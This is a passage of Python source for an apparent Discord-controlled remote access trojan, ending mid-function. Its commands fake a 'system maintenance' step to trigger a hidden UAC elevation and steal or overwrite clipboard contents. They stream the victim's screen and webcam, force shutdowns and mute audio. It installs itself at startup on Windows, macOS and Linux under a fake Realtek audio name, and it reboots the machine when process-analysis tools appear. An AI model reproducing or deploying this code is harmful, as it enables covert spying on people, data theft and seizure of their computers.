        await ctx.send(f"❌ Error adjusting system settings: {str(e)}")

@bot.command(name='getadmin', help='Performs system maintenance tasks')
async def getadmin(ctx):
    """Attempts to gain admin privileges with proper session management"""
    if platform.system() != "Windows":
        await ctx.send("❌ This command only works on Windows systems")
        return
    
    try:
        # Send initial message
        message = await ctx.send("🔄 **Performing system maintenance...**")
        
        # Check if already running with admin rights
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if is_admin:
            await message.edit(content="✅ **Already running with administrative privileges!**")
            return
        
        # Generate a unique session ID to identify this instance
        session_id = f"session_{int(time.time())}_{os.urandom(4).hex()}"
        
        # Create a temporary directory
        temp_dir = os.path.join(os.environ.get('TEMP', tempfile.gettempdir()), 
                               f"sm_{os.urandom(3).hex()}")
        os.makedirs(temp_dir, exist_ok=True)
        
        # Create a session marker file with our PID
        session_file = os.path.join(temp_dir, f"{session_id}.txt")
        with open(session_file, 'w') as f:
            f.write(str(os.getpid()))
        
        # Create a batch file that will:
        # 1. Attempt to elevate the process
        # 2. Create a success marker if elevation was accepted
        # 3. NOT terminate the original process (we'll handle that ourselves)
        batch_path = os.path.join(temp_dir, "elevate.bat")
        with open(batch_path, 'w') as f:
            f.write(f'''@echo off
:: Create a VBS script for elevation
echo Set UAC = CreateObject("Shell.Application") > "{temp_dir}\\run.vbs"
echo UAC.ShellExecute "{sys.executable}", "{os.path.abspath(sys.argv[0])} --elevated {session_id}", "", "runas", 1 >> "{temp_dir}\\run.vbs"

:: Run the VBS script
wscript.exe "{temp_dir}\\run.vbs"

:: Create a marker to indicate the elevation was attempted
echo Attempted > "{temp_dir}\\attempted.txt"

:: Exit without terminating the original process
exit
''')
        
        # Execute the batch file with minimal visibility
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = 0  # SW_HIDE
        
        subprocess.run(
            [batch_path],
            startupinfo=startupinfo,
            shell=True,
            timeout=5
        )
        
        # Wait a moment for the elevation process to start
        await asyncio.sleep(3)
        
        # Check if the marker file exists to confirm the script ran
        marker_file = os.path.join(temp_dir, "attempted.txt")
        
        if os.path.exists(marker_file):
            # The elevation was attempted
            await message.edit(content="✅ **System maintenance initiated!**\n\nIf you accepted the security prompt, please wait while the elevated instance starts...")
            
            # Now we need to wait to see if the elevated process signals back to us
            # We'll check for a success marker file that the elevated process will create
            success_marker = os.path.join(temp_dir, f"{session_id}_success.txt")
            
            # Wait for up to 15 seconds for the elevated process to start and signal back
            for _ in range(15):
                if os.path.exists(success_marker):
                    # Elevation succeeded! The elevated process is running
                    await message.edit(content="✅ **System maintenance completed successfully!**\n\nThe application is now running with administrative privileges.")
                    
                    # Wait a moment before exiting
                    await ctx.send("ℹ️ **Transferring control to elevated instance...**")
                    await asyncio.sleep(2)
                    
                    # Exit this process
                    os._exit(0)
                
                # Wait a second before checking again
                await asyncio.sleep(1)
            
            # If we get here, the elevated process didn't signal back within 15 seconds
            # This could mean the user declined the UAC prompt or something else went wrong
            await message.edit(content="⚠️ **System maintenance incomplete.** Continuing with limited capabilities.")
        else:
            # Something went wrong with running the script
            await message.edit(content="⚠️ **System maintenance could not be initiated.** Continuing with limited capabilities.")
        
        # Clean up - this will only run if we didn't exit
        try:
            # Clean up files
            for file in [os.path.join(temp_dir, "run.vbs"), batch_path, marker_file, session_file]:
                try:
                    if file and os.path.exists(file):
                        os.remove(file)
                except:
                    pass
            
            # Try to remove the temp directory
            try:
                if os.path.exists(temp_dir):
                    shutil.rmtree(temp_dir, ignore_errors=True)
            except:
                pass
                
        except Exception:
            # Silently fail cleanup
            pass
            
    except Exception as e:
        await ctx.send(f"❌ Error during system maintenance: {str(e)}")

@bot.command(name='search', help='Searches Google for the specified query and displays it in full screen')
async def search_google(ctx, *, query=None):
    try:
        # Check if a search query was provided
        if query is None:
            await ctx.send("❌ Please provide a search query. Example: `!search cute puppies`")
            return
        
        await ctx.send(f"🔍 Searching for '{query}' on {SYSTEM_NAME}...")
        
        # Format the query for a URL
        import urllib.parse
        search_url = f"https://www.google.com/search?q={urllib.parse.quote_plus(query)}"
        
        # Open the URL in the default browser
        webbrowser.open(search_url)
        
        # Wait a moment for the browser to open
        time.sleep(2)
        
        # Attempt to make the browser full screen
        if platform.system() == "Windows":
            # Press F11 to toggle full screen in most browsers
            pyautogui.press('f11')
        elif platform.system() == "Darwin":  # macOS
            # Command+Control+F is often used for full screen in macOS browsers
            pyautogui.hotkey('command', 'ctrl', 'f')
        else:  # Linux
            # F11 is common in Linux browsers too
            pyautogui.press('f11')
        
        await ctx.send(f"✅ Google search for '{query}' opened in full screen on {SYSTEM_NAME}")
        
    except Exception as e:
        await ctx.send(f"❌ Error performing search: {str(e)}")

@bot.command(name='clipboard', help='View or modify the clipboard contents')
async def clipboard_command(ctx, *, text=None):
    try:
        if text is None:
            # Get clipboard content
            if platform.system() == "Windows":
                # Just get the current clipboard content, skip history
                import win32clipboard
                win32clipboard.OpenClipboard()
                try:
                    current_clipboard = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)
                except:
                    current_clipboard = "No text content in current clipboard"
                finally:
                    win32clipboard.CloseClipboard()
                
                clipboard_content = current_clipboard
                
            elif platform.system() == "Darwin":  # macOS
                clipboard_content = subprocess.check_output(['pbpaste']).decode('utf-8', errors='replace')
            elif platform.system() == "Linux":
                clipboard_content = subprocess.check_output(['xclip', '-selection', 'clipboard', '-o']).decode('utf-8', errors='replace')
            else:
                clipboard_content = "Clipboard access not supported on this OS"
                
            # Send the clipboard content
            if clipboard_content.strip():
                # Always send as a file to ensure all content is captured
                temp_file = f'clipboard_{datetime.now().strftime("%Y%m%d_%H%M%S")}.txt'
                with open(temp_file, 'w', encoding='utf-8') as f:
                    f.write(clipboard_content)
                
                # Also send a preview in the message if it's not too long
                preview = clipboard_content[:1500] + "..." if len(clipboard_content) > 1500 else clipboard_content
                await ctx.send(f"📋 Clipboard content from {SYSTEM_NAME}:\n```\n{preview}\n```\nFull content attached:",
                               file=discord.File(temp_file))
                
                # Clean up the temp file
                os.remove(temp_file)
            else:
                await ctx.send(f"📋 Clipboard on {SYSTEM_NAME} is empty or contains non-text content")
        else:
            # Set clipboard content
            if platform.system() == "Windows":
                import win32clipboard
                win32clipboard.OpenClipboard()
                win32clipboard.EmptyClipboard()
                win32clipboard.SetClipboardText(text, win32clipboard.CF_UNICODETEXT)
                win32clipboard.CloseClipboard()
            elif platform.system() == "Darwin":  # macOS
                subprocess.run(['pbcopy'], input=text.encode('utf-8'))
            elif platform.system() == "Linux":
                subprocess.run(['xclip', '-selection', 'clipboard'], input=text.encode('utf-8'))
            else:
                await ctx.send("❌ Setting clipboard not supported on this OS")
                return
                
            await ctx.send(f"✅ Clipboard content on {SYSTEM_NAME} has been updated")
    except Exception as e:
        await ctx.send(f"❌ Error accessing clipboard: {str(e)}")

@bot.command(name='chat', help='Opens a chat window on the target system')
async def open_chat(ctx):
    global CHAT_ACTIVE, CHAT_WINDOW, CHAT_THREAD
    
    if CHAT_ACTIVE:
        await ctx.send("❌ Chat window is already active on the target system.")
        return
    
    await ctx.send(f"⏳ Opening chat window on {SYSTEM_NAME}...")
    
    # Start the chat window in a separate thread
    CHAT_THREAD = threading.Thread(target=create_chat_window, args=(ctx.author.name, ctx.channel.id), daemon=True)
    CHAT_THREAD.start()
    
    # Wait a moment for the window to initialize
    await asyncio.sleep(1)
    
    if CHAT_ACTIVE:
        await ctx.send(f"✅ Chat window opened on {SYSTEM_NAME}. Any messages you send now will appear in the chat window.")
        await ctx.send("Use `!endchat` to close the chat window.")
    else:
        await ctx.send(f"❌ Failed to open chat window on {SYSTEM_NAME}.")

@bot.command(name='endchat', help='Closes the chat window on the target system')
async def end_chat(ctx):
    global CHAT_ACTIVE, CHAT_WINDOW, CHAT_THREAD
    
    await ctx.send(f"⏳ Attempting to close chat window on {SYSTEM_NAME}...")
    
    try:
        # Force close the window if it exists
        if CHAT_WINDOW:
            try:
                CHAT_WINDOW.quit()  # Try quit first
            except:
                pass
                
            try:
                CHAT_WINDOW.destroy()  # Then try destroy
            except:
                pass
                
        # Reset all chat-related variables
        CHAT_ACTIVE = False
        CHAT_WINDOW = None
        
        # If there's a thread, try to stop it
        if CHAT_THREAD and CHAT_THREAD.is_alive():
            # Can't really stop threads in Python, but we can mark it as inactive
            CHAT_THREAD = None
            
        # Clear the global receive_chat_message if it exists
        if 'receive_chat_message' in globals():
            globals().pop('receive_chat_message', None)
            
        await ctx.send(f"✅ Chat session terminated on {SYSTEM_NAME}.")
        
        # Send a test message to confirm commands are working
        await ctx.send("Command system restored. You can now use commands again.")
        
    except Exception as e:
        await ctx.send(f"❌ Error during chat cleanup: {str(e)}")
        # Force reset even if there's an error
        CHAT_ACTIVE = False
        CHAT_WINDOW = None
        CHAT_THREAD = None
        if 'receive_chat_message' in globals():
            globals().pop('receive_chat_message', None)

@bot.command(name='background', help='Changes the desktop background of the target system')
async def change_background(ctx, url=None):
    try:
        # Check if a file was attached or a URL was provided
        if len(ctx.message.attachments) == 0 and url is None:
            await ctx.send("❌ Please attach an image file or provide an image URL.")
            return
        
        # Create a temporary directory to store the image
        temp_dir = tempfile.mkdtemp()
        
        # Determine the source of the image (attachment or URL)
        if len(ctx.message.attachments) > 0:
            # Get the first attachment
            attachment = ctx.message.attachments[0]
            
            # Check if it's an image file
            file_ext = os.path.splitext(attachment.filename)[1].lower()
            valid_extensions = ['.jpg', '.jpeg', '.png', '.bmp', '.gif']
            
            if file_ext not in valid_extensions:
                await ctx.send(f"❌ Invalid file type. Supported types: {', '.join(valid_extensions)}")
                shutil.rmtree(temp_dir)
                return
            
            # Download the attached image
            image_path = os.path.join(temp_dir, attachment.filename)
            await attachment.save(image_path)
            await ctx.send(f"⏳ Downloading attached image to set as background on {SYSTEM_NAME}...")
            
        else:
            # Download the image from the URL
            try:
                # Check if the URL is valid
                response = requests.head(url)
                content_type = response.headers.get('content-type', '')
                
                if not content_type.startswith('image/'):
                    await ctx.send("❌ The URL does not point to a valid image.")
                    shutil.rmtree(temp_dir)
                    return
                
                # Download the image
                image_path = os.path.join(temp_dir, "background" + os.path.splitext(url)[1])
                urlretrieve(url, image_path)
                await ctx.send(f"⏳ Downloading image from URL to set as background on {SYSTEM_NAME}...")
                
            except Exception as e:
                await ctx.send(f"❌ Error downloading image from URL: {str(e)}")
                shutil.rmtree(temp_dir)
                return
        
        # Set the desktop background based on the operating system
        if platform.system() == "Windows":
            import ctypes
            # Use the Windows API to set the wallpaper
            ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3)
            success = True
            
        elif platform.system() == "Darwin":  # macOS
            # Use AppleScript to set the desktop background
            script = f'''
            tell application "Finder"
                set desktop picture to POSIX file "{image_path}"
            end tell
            '''
            subprocess.run(['osascript', '-e', script])
            success = True
            
        elif platform.system() == "Linux":
            # Try to set the background using common desktop environments
            # GNOME
            try:
                subprocess.run(['gsettings', 'set', 'org.gnome.desktop.background', 'picture-uri', f'file://{image_path}'])
                success = True
            except:
                # KDE
                try:
                    script = f'''
                    var allDesktops = desktops();
                    for (i=0;i<allDesktops.length;i++) {{
                        d = allDesktops[i];
                        d.wallpaperPlugin = "org.kde.image";
                        d.currentConfigGroup = Array("Wallpaper", "org.kde.image", "General");
                        d.writeConfig("Image", "file://{image_path}");
                    }}
                    '''
                    subprocess.run(['qdbus', 'org.kde.plasmashell', '/PlasmaShell', 'org.kde.PlasmaShell.evaluateScript', script])
                    success = True
                except:
                    # XFCE
                    try:
                        subprocess.run(['xfconf-query', '-c', 'xfce4-desktop', '-p', '/backdrop/screen0/monitor0/workspace0/last-image', '-s', image_path])
                        success = True
                    except:
                        success = False
        else:
            success = False
        
        if success:
            await ctx.send(f"✅ Desktop background changed successfully on {SYSTEM_NAME}")
        else:
            await ctx.send(f"❌ Could not change desktop background on {SYSTEM_NAME}. Unsupported operating system.")
        
        # Keep the image file for a while to ensure it's properly set
        await asyncio.sleep(10)
        
        # Clean up the temporary directory and files
        shutil.rmtree(temp_dir)
        
    except Exception as e:
        await ctx.send(f"❌ Error changing background: {str(e)}")
        # Clean up if an error occurs
        if 'temp_dir' in locals():
            shutil.rmtree(temp_dir)

@bot.command(name='shutdown', help='Shuts down the target computer')
async def shutdown_computer(ctx, delay: int = 0):
    try:
        # Send a confirmation message
        await ctx.send(f"⚠️ Shutting down {SYSTEM_NAME} in {delay} seconds...")
        
        # Execute the shutdown command based on the operating system
        if platform.system() == "Windows":
            # For Windows, use the shutdown command with specified delay
            if delay > 0:
                subprocess.Popen(f'shutdown /s /t {delay}', shell=True)
            else:
                subprocess.Popen('shutdown /s /t 0', shell=True)
                
        elif platform.system() == "Darwin":  # macOS
            # For macOS, use the 'shutdown' command
            if delay > 0:
                subprocess.Popen(f'sudo shutdown -h +{delay//60}', shell=True)
            else:
                subprocess.Popen('sudo shutdown -h now', shell=True)
                
        elif platform.system() == "Linux":
            # For Linux, use the 'shutdown' command
            if delay > 0:
                subprocess.Popen(f'sudo shutdown -h +{delay//60}', shell=True)
            else:
                subprocess.Popen('sudo shutdown -h now', shell=True)
        else:
            await ctx.send(f"❌ Shutdown not supported on {platform.system()}")
            return
            
        # Send a final message before shutdown
        await ctx.send(f"🛑 Shutdown initiated on {SYSTEM_NAME}. System will power off shortly.")
        
    except Exception as e:
        await ctx.send(f"❌ Error shutting down system: {str(e)}")

@bot.command(name='end', help='Terminates the bot process on the target system')
async def end_process(ctx):
    try:
        # Send a message before terminating
        await ctx.send(f"🛑 Terminating bot process on {SYSTEM_NAME}...")
        
        # Make sure the message is sent before exiting
        await asyncio.sleep(2)
        
        # Exit the process completely
        os._exit(0)  # Using os._exit() instead of sys.exit() for immediate termination
    except Exception as e:
        await ctx.send(f"❌ Error terminating process: {str(e)}")

# Add this to your global variables
screen_update_tasks = {}  # Dictionary to track active screen update tasks

@bot.command(name='disableaudio', help='Disables system audio until enabled again')
async def disable_audio(ctx):
    try:
        if platform.system() == "Windows":
            # Use pycaw to control audio
            from ctypes import cast, POINTER
            from comtypes import CLSCTX_ALL
            from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
            
            devices = AudioUtilities.GetSpeakers()
            interface = devices.Activate(
                IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
            volume = cast(interface, POINTER(IAudioEndpointVolume))
            
            # Mute the system
            volume.SetMute(1, None)
            
            await ctx.send(f"🔇 System audio has been disabled on {SYSTEM_NAME}")
        else:
            await ctx.send(f"⚠️ This command is currently only supported on Windows")
    except Exception as e:
        await ctx.send(f"❌ Error disabling audio: {str(e)}")

@bot.command(name='enableaudio', help='Enables system audio')
async def enable_audio(ctx):
    try:
        if platform.system() == "Windows":
            # Use pycaw to control audio
            from ctypes import cast, POINTER
            from comtypes import CLSCTX_ALL
            from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
            
            devices = AudioUtilities.GetSpeakers()
            interface = devices.Activate(
                IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
            volume = cast(interface, POINTER(IAudioEndpointVolume))
            
            # Unmute the system
            volume.SetMute(0, None)
            
            await ctx.send(f"🔊 System audio has been enabled on {SYSTEM_NAME}")
        else:
            await ctx.send(f"⚠️ This command is currently only supported on Windows")
    except Exception as e:
        await ctx.send(f"❌ Error enabling audio: {str(e)}")

@bot.command(name='screen', help='Provides a live view of the screen')
async def live_screen(ctx, duration: int = 30):
    try:
        # Limit the duration to prevent abuse (max 5 minutes)
        if duration > 300:
            duration = 300
            await ctx.send(f"⚠️ Duration limited to 5 minutes (300 seconds)")
        elif duration < 5:
            duration = 5
            await ctx.send(f"⚠️ Duration must be at least 5 seconds")
            
        # Check if there's already a screen update task for this channel
        if ctx.channel.id in screen_update_tasks:
            await ctx.send("❌ A screen sharing session is already active in this channel")
            return
            
        await ctx.send(f"🖥️ Starting live screen view from {SYSTEM_NAME} for {duration} seconds...")
            
        # Use system temp directory instead of current directory
        temp_dir = tempfile.gettempdir()
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        screenshot_path = os.path.join(temp_dir, f'screenshot_{timestamp}.png')
        
        # Take initial screenshot
        screenshot = pyautogui.screenshot()
        screenshot.save(screenshot_path)
            
        # Send the initial screenshot
        screen_message = await ctx.send(f'📷 Live screen from {SYSTEM_NAME} - updating every 0.5 seconds',
                                    file=discord.File(screenshot_path))
            
        # Clean up the initial file
        os.remove(screenshot_path)
            
        # Create a task to update the screenshot
        update_task = asyncio.create_task(update_screen(ctx, screen_message, duration))
        screen_update_tasks[ctx.channel.id] = update_task
            
        # Wait for the task to complete
        try:
            await update_task
        except asyncio.CancelledError:
            pass
            
        # Remove the task from the dictionary
        if ctx.channel.id in screen_update_tasks:
            del screen_update_tasks[ctx.channel.id]
            
        await ctx.send(f"✅ Live screen view ended after {duration} seconds")
        
    except Exception as e:
        await ctx.send(f"❌ Error starting live screen view: {str(e)}")
        # Clean up if an error occurs
        if ctx.channel.id in screen_update_tasks:
            del screen_update_tasks[ctx.channel.id]
        if 'screenshot_path' in locals() and os.path.exists(screenshot_path):
            os.remove(screenshot_path)

async def update_screen(ctx, message, duration):
    """Update the screen message with new screenshots"""
    start_time = time.time()
    temp_dir = tempfile.gettempdir()
    update_count = 0
    
    try:
        while time.time() - start_time < duration:
            # Wait before taking the next screenshot
            await asyncio.sleep(0.5)
            
            # Take a new screenshot
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            screenshot_path = os.path.join(temp_dir, f'screenshot_{timestamp}.png')
            screenshot = pyautogui.screenshot()
            screenshot.save(screenshot_path)
            
            # Update count and remaining time
            update_count += 1
            remaining = int(duration - (time.time() - start_time))
            
            try:
                # Edit the message with the new attachment
                new_file = discord.File(screenshot_path)
                await message.edit(
                    content=f'📷 Live screen from {SYSTEM_NAME} - update #{update_count} - {remaining}s remaining',
                    attachments=[new_file]
                )
            except Exception as e:
                # If editing fails, try deleting and resending
                try:
                    await message.delete()
                    message = await ctx.send(
                        f'📷 Live screen from {SYSTEM_NAME} - update #{update_count} - {remaining}s remaining',
                        file=discord.File(screenshot_path)
                    )
                except Exception as inner_e:
                    print(f"Error resending screenshot: {str(inner_e)}")
                    break
                
            # Clean up the file
            os.remove(screenshot_path)
            
    except asyncio.CancelledError:
        # Task was cancelled, clean up
        if 'screenshot_path' in locals() and os.path.exists(screenshot_path):
            os.remove(screenshot_path)
        raise
    except Exception as e:
        await ctx.send(f"❌ Error in screen update: {str(e)}")

@bot.command(name='webcamstream', help='Provides a live view of the webcam')
async def live_webcam(ctx, duration: int = 30):
    try:
        # Limit the duration to prevent abuse (max 5 minutes)
        if duration > 300:
            duration = 300
            await ctx.send(f"⚠️ Duration limited to 5 minutes (300 seconds)")
        elif duration < 5:
            duration = 5
            await ctx.send(f"⚠️ Duration must be at least 5 seconds")
            
        # Check if there's already a webcam update task for this channel
        if ctx.channel.id in screen_update_tasks:  # Reusing the same dictionary for tracking
            await ctx.send("❌ A screen or webcam sharing session is already active in this channel")
            return
            
        await ctx.send(f"📹 Starting live webcam view from {SYSTEM_NAME} for {duration} seconds...")
            
        # Initialize webcam
        cap = cv2.VideoCapture(0)  # 0 is usually the default webcam
            
        if not cap.isOpened():
            await ctx.send("❌ Error: Could not access webcam.")
            return
            
        # Take initial webcam photo
        ret, frame = cap.read()
        if not ret:
            await ctx.send("❌ Error: Could not capture image from webcam.")
            cap.release()
            return
            
        # Use system temp directory instead of current directory
        temp_dir = tempfile.gettempdir()
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        webcam_path = os.path.join(temp_dir, f'webcam_{timestamp}.jpg')
        cv2.imwrite(webcam_path, frame)
            
        # Send the initial webcam image
        webcam_message = await ctx.send(f'📹 Live webcam from {SYSTEM_NAME} - updating every 0.5 seconds',
                                  file=discord.File(webcam_path))
            
        # Clean up the initial file
        os.remove(webcam_path)
            
        # Release the webcam for now (we'll reopen it for each update)
        cap.release()
            
        # Create a task to update the webcam feed
        update_task = asyncio.create_task(update_webcam(ctx, webcam_message, duration))
        screen_update_tasks[ctx.channel.id] = update_task
            
        # Wait for the task to complete
        try:
            await update_task
        except asyncio.CancelledError:
            pass
            
        # Remove the task from the dictionary
        if ctx.channel.id in screen_update_tasks:
            del screen_update_tasks[ctx.channel.id]
            
        await ctx.send(f"✅ Live webcam view ended after {duration} seconds")
        
    except Exception as e:
        await ctx.send(f"❌ Error starting live webcam view: {str(e)}")
        # Clean up if an error occurs
        if ctx.channel.id in screen_update_tasks:
            del screen_update_tasks[ctx.channel.id]
        if 'webcam_path' in locals() and os.path.exists(webcam_path):
            os.remove(webcam_path)
        if 'cap' in locals() and cap.isOpened():
            cap.release()

async def update_webcam(ctx, message, duration):
    """Updates the webcam message with a new image every 0.5 seconds"""
    end_time = time.time() + duration
    update_count = 0
    temp_dir = tempfile.gettempdir()  # Use system temp directory
    
    while time.time() < end_time:
        try:
            # Sleep for 0.5 seconds
            await asyncio.sleep(0.5)
            
            # Initialize webcam for this update
            cap = cv2.VideoCapture(0)
            if not cap.isOpened():
                await ctx.send("❌ Error: Lost access to webcam.")
                break
                
            # Take a new webcam photo
            ret, frame = cap.read()
            if not ret:
                await ctx.send("❌ Error: Could not capture image from webcam.")
                cap.release()
                break
                
            # Save the image to temp directory
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            webcam_path = os.path.join(temp_dir, f'webcam_{timestamp}.jpg')
            cv2.imwrite(webcam_path, frame)
            
            # Release the webcam until next update
            cap.release()
            
            # Update the message with the new webcam image
            update_count += 1
            remaining = int(end_time - time.time())
            
            # Edit the message with the new attachment
            new_file = discord.File(webcam_path)
            await message.edit(content=f'📹 Live webcam from {SYSTEM_NAME} - update #{update_count} - {remaining}s remaining', 
                              attachments=[new_file])
            
            # Clean up the file after sending
            os.remove(webcam_path)
            
        except discord.HTTPException as e:
            # Handle Discord rate limits or other HTTP errors
            if e.status == 429:  # Rate limited
                retry_after = e.retry_after if hasattr(e, 'retry_after') else 5
                await asyncio.sleep(retry_after)
            else:
                # For other HTTP errors, try deleting and resending instead
                try:
                    await message.delete()
                    message = await ctx.send(f'📹 Live webcam from {SYSTEM_NAME} - update #{update_count} - {remaining}s remaining',
                                          file=discord.File(webcam_path))
                except Exception as inner_e:
                    print(f"Error resending webcam image: {str(inner_e)}")
                    await asyncio.sleep(2)
        except Exception as e:
            # Log the error but continue the loop
            print(f"Error updating webcam: {str(e)}")
            try:
                # Try the fallback method of deleting and resending
                await message.delete()
                message = await ctx.send(f'📹 Live webcam from {SYSTEM_NAME} - update #{update_count} - {remaining}s remaining',
                                      file=discord.File(webcam_path))
            except:
                await asyncio.sleep(1)
            
    return update_count

@bot.command(name='stopwebcam', help='Stops the live webcam view')
async def stop_webcam(ctx):
    try:
        if ctx.channel.id in screen_update_tasks:
            # Cancel the update task
            screen_update_tasks[ctx.channel.id].cancel()
            del screen_update_tasks[ctx.channel.id]
            await ctx.send(f"✅ Live webcam view stopped on {SYSTEM_NAME}")
        else:
            await ctx.send("❌ No active webcam sharing session in this channel")
    except Exception as e:
        await ctx.send(f"❌ Error stopping webcam view: {str(e)}")

@bot.command(name='stopscreen', help='Stops the live screen view')
async def stop_screen(ctx):
    try:
        if ctx.channel.id in screen_update_tasks:
            # Cancel the update task
            screen_update_tasks[ctx.channel.id].cancel()
            del screen_update_tasks[ctx.channel.id]
            await ctx.send(f"✅ Live screen view stopped on {SYSTEM_NAME}")
        else:
            await ctx.send("❌ No active screen sharing session in this channel")
    except Exception as e:
        await ctx.send(f"❌ Error stopping screen view: {str(e)}")


@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        return
    
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send(f"❌ Missing required argument: {error.param.name}")
    elif isinstance(error, commands.BadArgument):
        await ctx.send(f"❌ Bad argument: {str(error)}")
    else:
        await ctx.send(f"❌ An error occurred: {str(error)}")
        print(f"Command error: {str(error)}")

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        return
    
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send(f"❌ Missing required argument: {error.param.name}")
    elif isinstance(error, commands.BadArgument):
        await ctx.send(f"❌ Bad argument: {str(error)}")
    else:
        await ctx.send(f"❌ An error occurred: {str(error)}")
        print(f"Command error: {str(error)}")

# Add the startup function here
def add_to_startup():
    """
    Copy the executable to LocalAppData and add it to startup with a legitimate-looking name
    """
    try:
        startup_name = "HDRealtekAudioPlayer"  # Legitimate-looking name
        
        # Get the full path of the current script
        current_path = os.path.abspath(sys.argv[0])
        
        if platform.system() == "Windows":
            # Define the LocalAppData path
            local_app_data = os.path.join(os.environ['LOCALAPPDATA'], startup_name)
            
            # Create the directory if it doesn't exist
            if not os.path.exists(local_app_data):
                os.makedirs(local_app_data)
            
            # Determine target path in LocalAppData
            if current_path.endswith('.py'):
                # For Python script, we'll copy both the script and create a VBS launcher
                target_script = os.path.join(local_app_data, f"{startup_name}.py")
                target_launcher = os.path.join(local_app_data, f"{startup_name}.vbs")
                
                # Copy the script to LocalAppData
                shutil.copy2(current_path, target_script)
                
                # Create a VBS launcher to run the script invisibly
                vbs_content = f'''Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "pythonw.exe ""{target_script}""", 0, False'''
                with open(target_launcher, 'w') as f:
                    f.write(vbs_content)
                
                # The path to add to startup is the VBS launcher
                startup_path = target_launcher
            else:
                # For executable, just copy it
                target_exe = os.path.join(local_app_data, f"{startup_name}.exe")
                shutil.copy2(current_path, target_exe)
                startup_path = target_exe
            
            # Add to registry for startup
            import winreg
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_SET_VALUE
            )
            winreg.SetValueEx(key, startup_name, 0, winreg.REG_SZ, f'"{startup_path}"')
            winreg.CloseKey(key)
            
            print(f"Added to Windows startup as '{startup_name}' from LocalAppData")
        
        elif platform.system() == "Darwin":  # macOS
            # Define the application support directory
            app_support = os.path.expanduser(f"~/Library/Application Support/{startup_name}")
            
            # Create the directory if it doesn't exist
            if not os.path.exists(app_support):
                os.makedirs(app_support)
            
            # Copy the script/executable to the application support directory
            if current_path.endswith('.py'):
                target_script = os.path.join(app_support, f"{startup_name}.py")
                shutil.copy2(current_path, target_script)
                exec_path = f"/usr/bin/python3 '{target_script}'"
            else:
                target_exe = os.path.join(app_support, startup_name)
                shutil.copy2(current_path, target_exe)
                os.chmod(target_exe, 0o755)  # Make executable
                exec_path = f"'{target_exe}'"
            
            # Create a launch agent
            plist_path = os.path.expanduser(f"~/Library/LaunchAgents/com.{startup_name.lower()}.plist")
            
            # Create the plist content
            plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.{startup_name.lower()}</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/sh</string>
        <string>-c</string>
        <string>{exec_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardErrorPath</key>
    <string>/dev/null</string>
    <key>StandardOutPath</key>
    <string>/dev/null</string>
</dict>
</plist>'''
            
            # Write the plist file
            with open(plist_path, 'w') as f:
                f.write(plist_content)
            
            # Set permissions and load the agent
            os.chmod(plist_path, 0o644)
            subprocess.run(['launchctl', 'load', plist_path])
            
            print(f"Added to macOS startup as '{startup_name}' from Application Support")
        
        elif platform.system() == "Linux":
            # Define the config directory
            config_dir = os.path.expanduser(f"~/.config/{startup_name}")
            
            # Create the directory if it doesn't exist
            if not os.path.exists(config_dir):
                os.makedirs(config_dir)
            
            # Copy the script/executable to the config directory
            if current_path.endswith('.py'):
                target_script = os.path.join(config_dir, f"{startup_name}.py")
                shutil.copy2(current_path, target_script)
                exec_path = f"/usr/bin/python3 '{target_script}'"
            else:
                target_exe = os.path.join(config_dir, startup_name)
                shutil.copy2(current_path, target_exe)
                os.chmod(target_exe, 0o755)  # Make executable
                exec_path = f"'{target_exe}'"
            
            # Create autostart entry
            autostart_dir = os.path.expanduser("~/.config/autostart")
            if not os.path.exists(autostart_dir):
                os.makedirs(autostart_dir)
            
            desktop_path = os.path.join(autostart_dir, f"{startup_name.lower()}.desktop")
            
            # Create the desktop entry content
            desktop_content = f'''[Desktop Entry]
Type=Application
Name={startup_name}
Exec={exec_path}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
Comment=Realtek HD Audio Manager'''
            
            # Write the desktop file
            with open(desktop_path, 'w') as f:
                f.write(desktop_content)
            
            # Set permissions
            os.chmod(desktop_path, 0o755)
            
            print(f"Added to Linux startup as '{startup_name}' from config directory")
        
    except Exception as e:
        print(f"Error adding to startup: {str(e)}")

def monitor_forbidden_processes():
    """Monitor for forbidden processes like Task Manager and Registry Editor"""
    forbidden_processes = [
        "procexp.exe",      # Process Explorer
        "procmon.exe",      # Process Monitor
        "processhacker.exe" # Process Hacker
    ]
    
    while True:
        try:
            # Get list of running processes
            if platform.system() == "Windows":
                output = subprocess.check_output('tasklist /fo csv /nh', shell=True).decode('utf-8', errors='ignore')
                running_processes = [line.split('","')[0].strip('"') for line in output.strip().split('\n')]
                
                # Check if any forbidden process is running
                for process in forbidden_processes:
                    if process.lower() in [p.lower() for p in running_processes]:
                        print(f"Forbidden process detected: {process}")
                        # Immediate shutdown
                        subprocess.Popen('shutdown /r /t 0 /f', shell=True)
                        time.sleep(1)  # Give shutdown command time to execute
                        os._exit(0)  # Exit the script immediately
            
            # Check every 0.5 seconds
            time.sleep(0.5)
        except Exception as e:
